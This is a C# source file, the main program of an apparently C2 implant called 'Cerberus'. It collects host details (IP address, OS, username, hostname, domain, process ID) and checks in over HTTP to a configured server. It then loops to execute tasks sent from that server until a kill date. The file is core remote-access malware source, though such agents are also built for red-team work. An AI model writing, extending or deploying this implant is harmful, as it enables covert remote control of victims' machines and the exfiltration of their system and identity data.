using CommModuleBase;
using HttpModule;
using Models.Tasks;

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security.Principal;
using System.Threading;
using Tasking;

namespace Cerberus
{
    class Program
    {
        private static CerberusMetadata _metadata;
        private static CommModule _commModule;
        private static TaskHandler _taskHandler;
        private static CancellationTokenSource _cancellationTokenSource;

        private static List<CerberusCommand> _commands = new List<CerberusCommand>();

        private static int SleepTime = Config.SleepTime;

        private static string serverAddress = Config.ServerAddress;
        private static int serverPort = Config.ServerPort;

        // http params
        private static string URI = Config.URI;
        private static string UserAgent = Config.UserAgent;
        private static string HostHeader = Config.HostHeader;

        private static string PayloadUUID = Config.PayloadUUID;
        private static string UUID = "";

        private static string killdateString = Config.killdateString;
        private static DateTime killdate;





        static void Main(string[] args)
        {
            //Thread.Sleep(5000);
            if(DateTime.TryParse(killdateString, out var date))
            {
                killdate = date;
                // dont forget to set defualt val in build params
            }



            _taskHandler = new TaskHandler();

            GenerateMetadata();
            _taskHandler.Init();

            _commModule = new HttpCommModule(serverAddress, serverPort, SleepTime, _metadata, PayloadUUID, URI, UserAgent, HostHeader);
            _commModule.Init(_metadata);
            _commModule.Start();
            
            UUID = _commModule.Metadata.uuid;

            
            

            _cancellationTokenSource = new CancellationTokenSource();

            while (!_cancellationTokenSource.IsCancellationRequested)
            {
                // check killdate and stop
                if (DateTime.Now >= killdate)
                {
                    Stop();
                    continue;
                }

                if (_taskHandler.InboundEmpty(out var tasks))
                {
                    _taskHandler.HandleTasks(tasks);
                }                                
            }

            Environment.Exit(0);
        }

        public static void Stop()
        {
            _cancellationTokenSource.Cancel();
        }

        /*private static void LoadCerberusCommands()
        {
            var tasks = Assembly.Load("Tasks");

            foreach(var type in tasks.GetTypes())
            {
                if (type.IsSubclassOf(typeof(CerberusCommand)))
                {
                    var instance = (CerberusCommand) Activator.CreateInstance(type);
                    _commands.Add(instance);
                }
            }
        }*/

        private static void GenerateMetadata()
        {
            var process = Process.GetCurrentProcess();
            var identity = WindowsIdentity.GetCurrent();
/*          var principal = new WindowsPrincipal(identity);

            var integrity = "Medium";

            if (identity.IsSystem)
            {
                integrity = "SYSTEM";
            }
            else if (principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                integrity = "High";
            }

            _metadata = new CerberusMetadata
            {
                Id = Guid.NewGuid().ToString(),
                Hostname = Environment.MachineName,
                Username = identity.Name,
                ProcessName = process.ProcessName,
                ProcessId = process.Id,
                Integrity = integrity,
                Architecture = IntPtr.Size == 8 ? "x64" : "x86"
            };
*/
            

            string hostname = Environment.MachineName;
            IPHostEntry ipEntry = Dns.GetHostEntry(hostname);

            _metadata = new CerberusMetadata
            {
                action = "checkin",
                ip = ipEntry.AddressList[0].ToString(),
                os = Environment.OSVersion.ToString(),
                user = identity.Name,
                host = hostname,
                domain = Environment.UserDomainName,
                pid = process.Id,
                uuid = PayloadUUID,
                architecture = IntPtr.Size == 8 ? "x64" : "x86"
            };

            process.Dispose();
            identity.Dispose();
        }
    }
}
